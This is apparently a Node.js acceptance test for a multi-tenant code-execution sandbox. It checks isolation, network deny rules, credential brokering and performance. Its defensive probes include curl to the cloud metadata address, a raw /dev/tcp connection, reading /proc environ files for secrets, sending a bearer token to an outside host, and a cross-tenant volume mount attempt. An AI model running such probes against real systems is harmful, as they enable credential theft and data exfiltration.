// scripts/acceptance/openshell-sandbox.mjs
//
// Acceptance + security + performance checks for the OpenShell execution
// provider against a REAL gateway (never mocked). Run it before any org is
// put on the openshell_runtime flag, and again after every OpenShell upgrade.
//
//   npm run build -w @orvyn/worker
//   OPENSHELL_GATEWAY_URL=https://openshell-gateway:8080 \
//   OPENSHELL_TLS_CA=... OPENSHELL_TLS_CERT=... OPENSHELL_TLS_KEY=... \
//   OPENSHELL_SANDBOX_IMAGE=orvyn/sandbox:0.1.2-2 \
//   ORVYN_TEST_DOCKER_IMAGE=orvyn/sandbox:0.1.2-2 \
//   ORVYN_TEST_WORKSPACE_ROOT=/opt/orvyn/workspaces/_acceptance \
//   node scripts/acceptance/openshell-sandbox.mjs [--json report.json]
//
import { createRequire } from "node:module";
import { spawnSync } from "node:child_process";
import * as fs from "node:fs";
import * as path from "node:path";
import * as os from "node:os";

const require = createRequire(import.meta.url);
// In the worker container: ORVYN_WORKER_DIST=/app/dist/sandbox (copy this file in with `docker compose cp`).
const dist = process.env.ORVYN_WORKER_DIST || path.resolve(path.dirname(new URL(import.meta.url).pathname), "../../apps/worker/dist/sandbox");
process.env.ORVYN_SANDBOX_POLICY_DIR ||= [path.resolve(dist, "../../sandbox-policies"), path.resolve(dist, "../../../sandbox-policies")].find((d) => fs.existsSync(d));
const { OpenShellExecutionProvider, openShellWorkspaceFor, classifyExecOutput } = require(`${dist}/openshell.js`);
const { DockerExecutionProvider } = require(`${dist}/docker.js`);
const { SandboxRuntime } = require(`${dist}/runtime.js`);

const cfg = {
  gateway: process.env.OPENSHELL_GATEWAY_URL,
  caCertFile: process.env.OPENSHELL_TLS_CA,
  clientCertFile: process.env.OPENSHELL_TLS_CERT,
  clientKeyFile: process.env.OPENSHELL_TLS_KEY,
  image: process.env.OPENSHELL_SANDBOX_IMAGE || "orvyn/sandbox:0.1.2-2",
  readyTimeoutS: 120,
};
if (!cfg.gateway) { console.error("OPENSHELL_GATEWAY_URL is required"); process.exit(2); }
const SECRET = `ORVYN_ACCEPTANCE_${Math.random().toString(36).slice(2)}`;
const credentialFixtures = {
  github: { type: "orvyn-github", env: { GITHUB_TOKEN: `ghp_${SECRET}`, GH_TOKEN: `ghp_${SECRET}` } },
  vercel: { type: "orvyn-vercel", env: { VERCEL_TOKEN: `vercel_${SECRET}` } },
  netlify: { type: "orvyn-netlify", env: { NETLIFY_AUTH_TOKEN: `netlify_${SECRET}` } },
  cloudflare: { type: "orvyn-cloudflare", env: { CLOUDFLARE_API_TOKEN: `cloudflare_${SECRET}` } },
};
cfg.credentialSource = async (_runId, integrationId) => credentialFixtures[integrationId]?.env ?? null;
const root = process.env.ORVYN_TEST_WORKSPACE_ROOT || fs.mkdtempSync(path.join(os.tmpdir(), "orvyn-os-accept-"));
fs.mkdirSync(root, { recursive: true });
const SANDBOX_UID = Number(process.env.OPENSHELL_SANDBOX_UID) || 1000;

const results = [];
const perf = {};
async function check(name, fn) {
  const t = Date.now();
  try {
    const detail = await fn();
    results.push({ name, ok: true, ms: Date.now() - t, detail: detail ?? "" });
    console.log(`  ✓ ${name}${detail ? ` — ${detail}` : ""}`);
  } catch (e) {
    results.push({ name, ok: false, ms: Date.now() - t, detail: String(e?.message ?? e).slice(0, 300) });
    console.log(`  ✗ ${name} — ${String(e?.message ?? e).slice(0, 300)}`);
  }
}
const assert = (c, m) => { if (!c) throw new Error(m); };
const res = { cpus: 1, memoryMb: 1024, pidsLimit: 256, commandTimeoutS: 60, maxLifetimeS: 900 };
const id = (org, run) => ({ organizationId: org, tenantId: `t-${org}`, userId: `u-${org}`, projectId: `p-${org}`, workspaceId: `w-${org}`, runId: run });
function workspace(name) {
  const dir = path.join(root, name);
  fs.rmSync(dir, { recursive: true, force: true });
  fs.mkdirSync(dir, { recursive: true });
  fs.chownSync(dir, SANDBOX_UID, SANDBOX_UID);
  return dir;
}
const sid = (tag) => `sbx_${tag}${Date.now().toString(36)}${Math.random().toString(36).slice(2, 6)}`;
const pct = (arr, p) => { const s = [...arr].sort((a, b) => a - b); return s[Math.min(s.length - 1, Math.floor(s.length * p))]; };

async function helperConversation(handle, script, calls) {
  const session = await p.attach(handle, { command: ["node", script], cwd: "/workspace", tty: false });
  let buffer = "";
  let diagnostics = "";
  const pending = new Map();
  session.onData((chunk) => {
    diagnostics = (diagnostics + chunk).slice(-4_000);
    buffer += chunk;
    let end;
    while ((end = buffer.indexOf("\n")) >= 0) {
      const line = buffer.slice(0, end).trim(); buffer = buffer.slice(end + 1);
      try {
        const parsed = JSON.parse(line);
        const waiter = pending.get(parsed.id);
        if (waiter) { pending.delete(parsed.id); waiter(parsed); }
      } catch { /* helper diagnostic */ }
    }
  });
  try {
    const replies = [];
    for (const [op, args = {}] of calls) {
      const requestId = `accept-${Date.now()}-${Math.random()}`;
      const response = new Promise((resolve, reject) => {
        const timer = setTimeout(() => {
          pending.delete(requestId);
          reject(new Error(`${op} helper timed out${diagnostics ? `: ${diagnostics}` : ""}`));
        }, 30_000);
        pending.set(requestId, (value) => { clearTimeout(timer); resolve(value); });
      });
      session.write(`${JSON.stringify({ id: requestId, op, args })}\n`);
      const exited = session.exited.then((code) => {
        throw new Error(`${op} helper exited ${code}${diagnostics ? `: ${diagnostics}` : ""}`);
      });
      replies.push(await Promise.race([response, exited]));
    }
    return replies;
  } finally {
    await session.close().catch(() => {});
  }
}

const p = new OpenShellExecutionProvider(cfg);
const handles = [];
console.log(`OpenShell acceptance against ${cfg.gateway} (image ${cfg.image})`);

let A, B;
const wsA = workspace("org-a"), wsB = workspace("org-b");
fs.writeFileSync(path.join(wsB, "secret-b.txt"), "org-b private bytes");
fs.chownSync(path.join(wsB, "secret-b.txt"), SANDBOX_UID, SANDBOX_UID);

await check("gateway healthy over mTLS", async () => {
  const h = await p.getHealth();
  assert(h.healthy, `unhealthy: ${h.detail}`);
  return `version ${h.version}, ${h.latencyMs} ms`;
});

await check("worker without a client certificate is refused", async () => {
  const anon = new OpenShellExecutionProvider({ ...cfg, clientCertFile: undefined, clientKeyFile: undefined });
  const h = await anon.getHealth();
  assert(!h.healthy, "gateway accepted a client without a certificate");
  return h.detail?.slice(0, 80);
});

await check("sandbox for org A starts (code-basic, plan limits)", async () => {
  A = await p.createSandbox({ sandboxId: sid("a"), identity: id("org-a", "run-a"), workspaceHostPath: wsA, resources: res, policyTemplate: "code-basic", retention: "ephemeral" });
  handles.push(A);
  return `${A.provisionMs} ms, scope ${A.scope}`;
});
await check("sandbox for org B starts in a different OpenShell workspace", async () => {
  B = await p.createSandbox({ sandboxId: sid("b"), identity: id("org-b", "run-b"), workspaceHostPath: wsB, resources: res, policyTemplate: "code-basic", retention: "ephemeral" });
  handles.push(B);
  assert(B.scope !== A.scope, "orgs share an OpenShell workspace");
  return `${B.provisionMs} ms, scope ${B.scope}`;
});

await check('"Create test.txt containing hello" lands in the ORVYN workspace', async () => {
  const r = await p.exec(A, "printf hello > /workspace/test.txt && cat /workspace/test.txt");
  assert(r.exitCode === 0 && r.stdout === "hello", JSON.stringify(r));
  assert(fs.readFileSync(path.join(wsA, "test.txt"), "utf8") === "hello", "host workspace does not have the file");
  return "host file == hello";
});

await check("real exit codes, stderr, and per-command timeout", async () => {
  const r = await p.exec(A, "echo oops >&2; exit 7");
  assert(r.exitCode === 7 && r.stderr.includes("oops"), JSON.stringify(r));
  const t = await p.exec(A, "sleep 20", { timeoutS: 2 });
  assert(t.timedOut && t.exitCode === 124, JSON.stringify(t));
  return `exit 7 kept; timeout → 124 after ${t.completedAt - t.startedAt} ms`;
});

await check("runs as a non-root user with no capabilities and no new privileges", async () => {
  const r = await p.exec(A, "id -u; grep -E 'CapEff|NoNewPrivs' /proc/self/status");
  assert(r.stdout.split("\n")[0] !== "0", "runs as root");
  assert(/CapEff:\s+0+\n/.test(r.stdout + "\n"), `capabilities: ${r.stdout}`);
  assert(/NoNewPrivs:\s+1/.test(r.stdout), `no_new_privs: ${r.stdout}`);
  return r.stdout.replace(/\s+/g, " ").trim();
});

await check("filesystem policy: only /workspace and /tmp are writable", async () => {
  const r = await p.exec(A, "for d in /etc /usr /opt /sandbox/.. /root; do touch $d/orvyn-probe 2>/dev/null && echo WROTE:$d; done; touch /tmp/ok && echo TMP_OK");
  assert(!r.stdout.includes("WROTE"), `wrote outside: ${r.stdout}`);
  assert(r.stdout.includes("TMP_OK"), "tmp not writable");
  return "writes outside refused";
});

await check("cross-tenant filesystem: org A cannot see org B's workspace", async () => {
  const r = await p.exec(A, `ls /workspace; cat ${wsB}/secret-b.txt 2>&1; find / -name secret-b.txt -not -path '/proc/*' 2>/dev/null | head -3`);
  assert(!r.stdout.includes("org-b private bytes"), "read org B bytes");
  assert(!/secret-b\.txt$/m.test(r.stdout.split("\n").slice(1).join("\n")), `found B file: ${r.stdout}`);
  return "not visible";
});

await check("cross-tenant sandbox access: org B cannot look up, exec in, or attach to org A's sandbox", async () => {
  const other = await p.getSandbox(A.sandboxId, id("org-b", "run-b"));
  assert(other === null, "org B resolved org A's sandbox");
  let refused = false;
  try { await p.exec({ ...A, scope: B.scope }, "echo pwned"); } catch { refused = true; }
  assert(refused, "exec with org B scope reached org A's sandbox");
  let attachRefused = false;
  try { const s = await p.attach({ ...A, scope: B.scope }); await s.close(); } catch { attachRefused = true; }
  assert(attachRefused, "terminal attach with org B scope reached org A's sandbox");
  return "not found in org B's scope";
});

await check("interactive terminal attaches to the authorized sandbox", async () => {
  const session = await p.attach(A, { cols: 100, rows: 30 });
  let output = "";
  session.onData((chunk) => { output += chunk; });
  session.write("printf ORVYN_ATTACH_OK\\n\nexit\n");
  const code = await Promise.race([
    session.exited,
    new Promise((_, reject) => setTimeout(() => reject(new Error("interactive terminal did not exit")), 15_000)),
  ]);
  await session.close().catch(() => {});
  assert(output.includes("ORVYN_ATTACH_OK"), `terminal output missing marker: ${output.slice(-300)}`);
  assert(code === 0, `terminal exited ${code}`);
  return "input/output and exit status verified";
});

await check("browser runs inside the sandbox and returns screenshot evidence", async () => {
  fs.writeFileSync(path.join(wsA, "browser.html"), "<!doctype html><title>ORVYN sandbox browser</title><h1 id=proof>inside sandbox</h1>");
  fs.chownSync(path.join(wsA, "browser.html"), SANDBOX_UID, SANDBOX_UID);
  const [opened, shot] = await helperConversation(A, "/usr/local/lib/orvyn/browser-server.mjs", [
    ["open", { url: "file:///workspace/browser.html" }],
    ["screenshot", {}],
  ]);
  assert(opened.ok && /ORVYN sandbox browser/.test(opened.output), JSON.stringify(opened).slice(0, 300));
  assert(shot.ok && String(shot.meta?.screenshot?.b64 ?? "").length > 1000, "screenshot bytes missing");
  assert(shot.meta?.url === "file:///workspace/browser.html", `browser session lost its page: ${JSON.stringify(shot.meta)}`);
  return "page title and PNG bytes returned by sandbox Chromium";
});

await check("MCP stdio server starts and is called inside the sandbox", async () => {
  fs.mkdirSync(path.join(wsA, ".orvyn"), { recursive: true });
  fs.writeFileSync(path.join(wsA, "mcp-fixture.mjs"), `
import readline from "node:readline";
for await (const line of readline.createInterface({input:process.stdin})) {
  const m=JSON.parse(line); if(m.id==null) continue;
  const result=m.method==="initialize"?{protocolVersion:"2025-03-26",capabilities:{},serverInfo:{name:"fixture",version:"1"}}:m.method==="tools/list"?{tools:[{name:"echo",description:"echo"}]}:{content:[{type:"text",text:String(m.params?.arguments?.text??"")}],isError:false};
  process.stdout.write(JSON.stringify({jsonrpc:"2.0",id:m.id,result})+"\\n");
}`);
  fs.writeFileSync(path.join(wsA, ".orvyn", "mcp.json"), JSON.stringify({ servers: { fixture: { command: "node", args: ["/workspace/mcp-fixture.mjs"] } } }));
  for (const file of [path.join(wsA, "mcp-fixture.mjs"), path.join(wsA, ".orvyn"), path.join(wsA, ".orvyn", "mcp.json")]) fs.chownSync(file, SANDBOX_UID, SANDBOX_UID);
  const [listed, called] = await helperConversation(A, "/usr/local/lib/orvyn/mcp-server.mjs", [
    ["list", {}],
    ["call", { server: "fixture", tool: "echo", arguments: { text: "MCP_IN_SANDBOX" } }],
  ]);
  assert(listed.ok && /fixture:/.test(listed.output) && /echo/.test(listed.output), JSON.stringify(listed));
  assert(called.ok && called.output === "MCP_IN_SANDBOX", JSON.stringify(called));
  return "stdio tools/list and tools/call verified";
});

await check("cross-tenant mount: org B cannot mount org A's workspace volume", async () => {
  const c = await p.connect();
  const volA = `orvyn-ws-${A.sandboxId.replace(/^sbx_/, "").toLowerCase()}`;
  let refused = "";
  try {
    await c.sandbox.create({
      name: `sbx-steal${Date.now().toString(36)}`, workspace: B.scope, command: ["sleep", "60"],
      rawSpec: { template: { image: cfg.image, driverConfig: { docker: { mounts: [{ type: "volume", source: volA, target: "/workspace", read_only: true }] } } } },
    });
  } catch (e) { refused = String(e?.message ?? e); }
  assert(refused, "gateway admitted org A's volume into org B's sandbox");
  return refused.slice(0, 120);
});

await check("deny-by-default network: registry, metadata, gateway, raw TCP all blocked", async () => {
  const probes = {
    registry: "curl -sS -m 8 https://registry.npmjs.org/ -o /dev/null",
    metadata: "curl -sS -m 5 http://169.254.169.254/latest/meta-data/ -o /dev/null",
    gateway: `curl -sS -m 5 -k https://host.openshell.internal:${new URL(cfg.gateway).port || 443}/ -o /dev/null`,
    rawtcp: "timeout 5 bash -c 'echo > /dev/tcp/1.1.1.1/443'",
  };
  const out = [];
  for (const [k, cmd] of Object.entries(probes)) {
    const r = await p.exec(A, cmd, { timeoutS: 20 });
    assert(r.exitCode !== 0, `${k} reachable`);
    const kind = classifyExecOutput(r);
    if (k !== "gateway") assert(kind === "network_policy_denied", `${k} failed but was not recognised as a policy denial: ${r.stderr.slice(0, 160)}`);
    out.push(`${k}:${kind ?? `exit ${r.exitCode}`}`);
  }
  return out.join(" ");
});

await check("live policy update: web-development opens registries for node/python only", async () => {
  await p.updateNetworkPolicy(A, "web-development");
  const curl = await p.exec(A, "curl -sS -m 10 https://registry.npmjs.org/ -o /dev/null", { timeoutS: 30 });
  assert(classifyExecOutput(curl) === "network_policy_denied", `curl (not an allowed binary) was not policy-denied: ${curl.stderr.slice(0, 160)}`);
  const other = await p.exec(A, `node -e "fetch('https://example.com').then(r=>console.log(r.status)).catch(e=>{console.error(String(e.cause||e));process.exit(3)})"`, { timeoutS: 30 });
  assert(classifyExecOutput(other) === "network_policy_denied", `node → example.com was not policy-denied: ${other.stderr.slice(0, 160)}`);
  const allowed = await p.exec(A, `node -e "fetch('https://registry.npmjs.org/').then(r=>console.log(r.status)).catch(e=>{console.error(String(e.cause||e));process.exit(3)})"`, { timeoutS: 30 });
  assert(allowed.exitCode === 0, `allowed egress did not reach the registry: ${allowed.stderr.slice(0, 240)}`);
  assert(/^200\s*$/.test(allowed.stdout), `registry returned unexpected status: ${allowed.stdout.slice(0, 80)}`);
  return "curl blocked; example.com blocked; node→registry HTTP 200";
});

for (const [integrationId, fixture] of Object.entries(credentialFixtures)) {
  await check(`credential brokering (${integrationId}): token never enters the sandbox`, async () => {
    const C = await p.createSandbox({
      sandboxId: sid(`c${integrationId}`), identity: id("org-a", `run-c-${integrationId}`), workspaceHostPath: workspace(`org-a-cred-${integrationId}`), resources: res,
      policyTemplate: integrationId === "github" ? "github" : "deployment", retention: "ephemeral",
      credentials: [{ organizationId: "org-a", integrationId, type: fixture.type }],
    });
    handles.push(C);
    const envName = Object.keys(fixture.env)[0];
    const r = await p.exec(C, `env | grep -E '^${envName}=' ; cat /proc/[0-9]*/environ 2>/dev/null | tr '\\0' '\\n' | grep -c ORVYN_ACCEPTANCE || true`);
    assert(!r.stdout.includes(SECRET), "secret value visible inside the sandbox");
    const ex = await p.exec(C, `curl -sS -m 8 -H "Authorization: Bearer \$${envName}" https://example.com/ -o /dev/null`, { timeoutS: 20 });
    assert(ex.exitCode !== 0, "token could be sent to a non-GitHub host");
    return `sandbox sees ${r.stdout.split("\n")[0].replace(/=.*/, "=<placeholder>") || "no token var"}; exfil host blocked`;
  });
  await check(`credential grant (${integrationId}) is organization-scoped`, async () => {
    let refused = false;
    try {
      await p.createSandbox({ sandboxId: sid(`x${integrationId}`), identity: id("org-b", `run-x-${integrationId}`), workspaceHostPath: workspace(`org-b-x-${integrationId}`), resources: res, policyTemplate: integrationId === "github" ? "github" : "deployment", retention: "ephemeral", credentials: [{ organizationId: "org-a", integrationId, type: fixture.type }] });
    } catch (e) { refused = e?.kind === "credential_policy_denied"; }
    assert(refused, "org B was able to use org A's credential grant");
  });
}

await check("durability: workspace bytes survive sandbox destruction", async () => {
  await p.destroy(A);
  handles.splice(handles.indexOf(A), 1);
  assert(fs.readFileSync(path.join(wsA, "test.txt"), "utf8") === "hello", "bytes lost");
  const v = spawnSync("docker", ["volume", "ls", "-q", "--filter", `name=orvyn-ws-${A.sandboxId.replace(/^sbx_/, "").toLowerCase()}`]);
  assert(!String(v.stdout).trim(), "workspace volume pointer left behind");
  return "file intact; volume pointer removed";
});

await check("worker restart: a new worker process reattaches to the live sandbox", async () => {
  const p2 = new OpenShellExecutionProvider(cfg); // fresh client, no in-memory state
  const again = await p2.getSandbox(B.sandboxId, id("org-b", "run-b"));
  assert(again && again.state === "ready", "sandbox not found after restart");
  const r = await p2.exec(again, "cat /workspace/secret-b.txt");
  assert(r.stdout === "org-b private bytes", "workspace not intact");
  return "reattached, same workspace";
});

await check("reconciliation removes an orphaned sandbox", async () => {
  const O = await p.createSandbox({ sandboxId: sid("o"), identity: id("org-a", "run-o"), workspaceHostPath: workspace("org-a-o"), resources: res, policyTemplate: "code-basic", retention: "ephemeral" });
  const rt = new SandboxRuntime({ emit: async () => {}, report: async () => {} }, { docker: new DockerExecutionProvider(), openshell: p });
  const live = new Set(handles.map((h) => h.sandboxId));
  const out = await rt.reconcile(live, Date.now() + 5 * 60_000);
  assert(out.removed.includes(O.sandboxId), `not removed: ${JSON.stringify(out)}`);
  assert(await p.getSandbox(B.sandboxId, id("org-b", "run-b")), "reconcile removed a live sandbox");
  return `removed ${out.removed.length}, kept live`;
});

// ── performance: OpenShell vs Docker ─────────────────────────────────────
const dockerImage = process.env.ORVYN_TEST_DOCKER_IMAGE || "";
await check("performance comparison (provision ×5, exec ×20)", async () => {
  const measure = async (prov, tag) => {
    const prov5 = [], exec20 = [];
    for (let i = 0; i < 5; i++) {
      const dir = workspace(`perf-${tag}-${i}`);
      const t = Date.now();
      const h = await prov.createSandbox({ sandboxId: sid(`${tag}${i}`), identity: id("org-perf", `run-${tag}${i}`), workspaceHostPath: dir, resources: res, policyTemplate: "code-basic", retention: "ephemeral" });
      prov5.push(Date.now() - t);
      if (i === 0) for (let j = 0; j < 20; j++) { const r = await prov.exec(h, "true"); exec20.push(r.completedAt - r.startedAt); }
      const d = Date.now();
      await prov.destroy(h);
      (perf[`${tag}_destroy`] ||= []).push(Date.now() - d);
    }
    perf[tag] = { provisionMedianMs: pct(prov5, 0.5), provisionMaxMs: Math.max(...prov5), execMedianMs: pct(exec20, 0.5), execP95Ms: pct(exec20, 0.95), destroyMedianMs: pct(perf[`${tag}_destroy`], 0.5) };
  };
  await measure(p, "openshell");
  if (dockerImage) await measure(new DockerExecutionProvider(dockerImage), "docker");
  delete perf.openshell_destroy; delete perf.docker_destroy;
  return JSON.stringify(perf);
});

for (const h of handles) await p.destroy(h).catch(() => {});
const failed = results.filter((r) => !r.ok);
console.log(`\n${results.length - failed.length}/${results.length} passed`);
const jsonAt = process.argv.indexOf("--json");
if (jsonAt > 0) fs.writeFileSync(process.argv[jsonAt + 1], JSON.stringify({ schemaVersion: 1, openshellVersion: "0.1.2", workloadImage: cfg.image, gateway: "private", at: new Date().toISOString(), results, perf }, null, 2));
process.exit(failed.length ? 1 : 0);
